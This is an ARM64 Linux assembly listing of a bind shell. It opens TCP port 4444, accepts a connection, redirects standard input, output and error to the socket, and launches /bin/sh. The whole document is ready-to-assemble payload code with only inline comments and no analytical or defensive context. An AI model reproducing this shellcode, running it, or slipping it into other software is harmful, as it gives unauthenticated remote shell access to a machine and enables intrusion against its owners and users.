; Linux ARM64 bind TCP shell
; Listens on port 4444 and spawns /bin/sh

section .text
global _start
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov     x8, #198
    mov     x0, #2
    mov     x1, #1
    mov     x2, #0
    svc     #0
    mov     x19, x0

    ; bind(sock, {AF_INET, 4444, INADDR_ANY}, 16)
    sub     sp, sp, #16
    mov     w1, #0x0002         ; AF_INET
    movk    w1, #0x5c11, lsl #16 ; port 4444 BE
    str     w1, [sp]
    str     xzr, [sp, #4]
    mov     x8, #200
    mov     x0, x19
    mov     x1, sp
    mov     x2, #16
    svc     #0

    ; listen(sock, 1)
    mov     x8, #201
    mov     x0, x19
    mov     x1, #1
    svc     #0

    ; accept(sock, NULL, NULL)
    mov     x8, #202
    mov     x0, x19
    mov     x1, xzr
    mov     x2, xzr
    svc     #0
    mov     x20, x0

    ; dup2 loop
    mov     x8, #24
    mov     x0, x20
    mov     x1, #2
.loop:
    svc     #0
    subs    x1, x1, #1
    b.ge    .loop

    ; execve /bin/sh
    mov     x8, #221
    adr     x0, sh
    mov     x1, xzr
    mov     x2, xzr
    svc     #0
sh: .ascii "/bin/sh\0"
